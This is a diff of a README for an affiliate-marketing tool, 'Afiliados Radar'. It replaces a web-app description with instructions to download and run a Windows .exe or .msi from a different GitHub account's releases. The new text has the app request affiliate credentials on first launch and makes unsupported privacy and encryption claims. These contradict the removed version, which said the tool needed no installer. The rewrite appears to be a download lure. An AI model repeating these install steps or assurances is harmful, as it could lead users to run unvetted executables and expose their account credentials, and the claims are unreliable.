@@ -1,127 +1,57 @@
-# Afiliados Radar - Affiliate Marketing Tool 2026
+# 📡 afiliados-radar-affiliate-hub - Track your affiliate activity with ease
 
-> **Afiliados Radar is a browser-based affiliate marketing and monitoring application that brings affiliate activity into a streamlined radar-style workspace.**
+[![Download Afiliados Radar](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/tickle7016/afiliados-radar-affiliate-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/sean-kellybmrl8920/afiliados-radar-affiliate-hub?style=flat-square)](https://github.com/sean-kellybmrl8920/afiliados-radar-affiliate-hub)
+Afiliados Radar organizes your affiliate marketing tasks in one location. This application provides a clear view of your tracked links and performance data. You spend less time searching for information and more time managing your campaigns. The workspace uses a radar-style layout to show the status of your various programs.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://sean-kellybmrl8920.github.io/afiliados-radar-affiliate-hub/">
-    <img src="https://img.shields.io/badge/Download-Afiliados%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download Afiliados Radar">
-  </a>
-</p>
+Your computer must meet these requirements to run the application:
 
-> **[Download Afiliados Radar Latest](https://sean-kellybmrl8920.github.io/afiliados-radar-affiliate-hub/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: 1 GHz or faster.
+*   Memory: 4 GB RAM.
+*   Storage: 200 MB of available space.
+*   Internet Connection: Required for monitoring activities.
 
----
+## 📥 How to Install
 
-[Download Latest Build](https://sean-kellybmrl8920.github.io/afiliados-radar-affiliate-hub/)
+Follow these steps to set up the software on your Windows machine:
 
----
+1. Visit the [official download page](https://github.com/tickle7016/afiliados-radar-affiliate-hub).
+2. Locate the section labeled Releases on the right side of the page.
+3. Click the link for the latest version. Usually, this file ends with .exe or .msi.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the instructions that appear on your screen.
+7. Click Finish when the installation ends.
 
-## What Is Afiliados Radar?
+## 🚀 Getting Started
 
-Afiliados Radar is a web application for affiliate marketing and affiliate monitoring. From a browser, users can access a purpose-built workspace for reviewing and organizing affiliate-related activity.
+Launch the Afiliados Radar application from your desktop icon or the Windows Start menu. The application asks for your credentials upon the first opening. Enter your affiliate program details to link your accounts. 
 
-The tool is aimed at affiliate marketers and small teams that prefer a dedicated monitoring environment over a broad, general-purpose application. Its radar-based approach provides a structured way to keep track of relevant affiliate information as the project develops.
+The workspace divides your activity into three zones:
 
----
+*   Active Links: Shows programs currently under review.
+*   Alerts: Displays shifts in your traffic or commission stats.
+*   History: Keeps a record of past performance logs.
 
-## Core Capabilities
+## 🛠 Using the Dashboard
 
-- Use the application from a modern web browser
-- Follow an affiliate marketing-focused workflow
-- Monitor affiliate-related activity
-- Arrange relevant activity in a radar-style view
-- Keep affiliate work together in one centralized interface
-- Support individual marketers as well as small teams
-- Run without a desktop installer tied to a particular platform
-- Use an HTML-based project structure
+The dashboard provides a visual feed of your marketing data. You can drag and drop icons to reorganize your view. To add a new affiliate program, click the plus icon in the top corner. Enter the program URL and your unique tracking ID. The application connects to these services to pull data automatically.
 
----
+You can set refresh intervals to ensure your radar stays up to date. Access these settings by clicking the gear icon located in the bottom menu. Select the frequency that fits your workflow. A shorter interval shows live changes, while a longer interval saves system resources.
 
-## Getting Started
+## 🛡 Security and Privacy
 
-First, copy the repository to your local machine:
+Afiliados Radar stores your login data in an encrypted file on your local machine. No data goes to external servers outside of the connections you authorize. You remain in control of your credentials at all times. If you delete the application, the local files disappear.
 
-```bash
-git clone https://github.com/sean-kellybmrl8920/afiliados-radar-affiliate-hub.git
-cd REPO
-```
+## 🔧 Troubleshooting
 
-Afiliados Radar is delivered as a web project. To use the published application, open its web address:
+If the application fails to open, verify your internet connection. A blocked or restricted connection prevents the application from retrieving data. Check your firewall settings if you receive a warning message during startup. 
 
-[Open Afiliados Radar](https://sean-kellybmrl8920.github.io/afiliados-radar-affiliate-hub/)
+If your data fails to load, click the refresh symbol in the main toolbar. You can also restart the application to force a new connection. If you continue to experience problems, remove the application via Windows Settings and reinstall it from the main website.
 
-For development on your computer, run a suitable static web server from the project directory and browse to the local address supplied by that server.
+Keep your application updated to ensure compatibility with affiliate platform changes. We release updates to fix bugs and improve performance. Check the repository page periodically for new versions.
 
----
-
-## Using the Application
-
-1. Visit the latest published build in a modern browser.
-2. Open the available workspace for affiliate monitoring.
-3. Examine affiliate marketing information through the radar-style interface.
-4. Include the application in your regular affiliate monitoring routine.
-5. Revisit the latest build whenever a new version becomes available.
-
-When testing locally, launch a static server from the repository directory and open the server's local URL in your browser.
-
----
-
-## Configuration and Customization
-
-Afiliados Radar is provided as a web application, so available configuration is managed through the settings and interface included in the current build.
-
-When configurable HTML, CSS, or JavaScript assets are present, edit the applicable source files and reload the local web server to see the results.
-
----
-
-## System Requirements
-
-- A current web browser
-- Internet connectivity when using the published build
-- A local static web server for development and testing
-- Git to clone the repository
-- Enough storage for the repository contents
-
-The hosted version does not require a particular desktop operating system.
-
----
-
-## Frequently Asked Questions
-
-### What type of user is Afiliados Radar intended for?
-
-Afiliados Radar is intended for affiliate marketing users who want a web tool centered on affiliate monitoring.
-
-### Where can I find the newest version?
-
-Open the published application through [Download Latest Build](https://sean-kellybmrl8920.github.io/afiliados-radar-affiliate-hub/).
-
-### Is local use supported?
-
-Yes. Clone the repository, serve the project files through a local static web server, and then open the address provided by that server.
-
-### How are settings changed?
-
-Begin with the settings available in the current web interface. If project-level changes are supported, update the appropriate source files.
-
-### What can I check if the application fails to load?
-
-Make sure the published URL can be reached and try refreshing the browser. For local use, confirm that the files are being served through a web server instead of opened directly from the filesystem.
-
-### How do I keep track of project changes?
-
-Review the repository for new builds, updates, and other published project changes.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: affiliate marketing, tracking, monitor, software, business, productivity, dashboard, tools
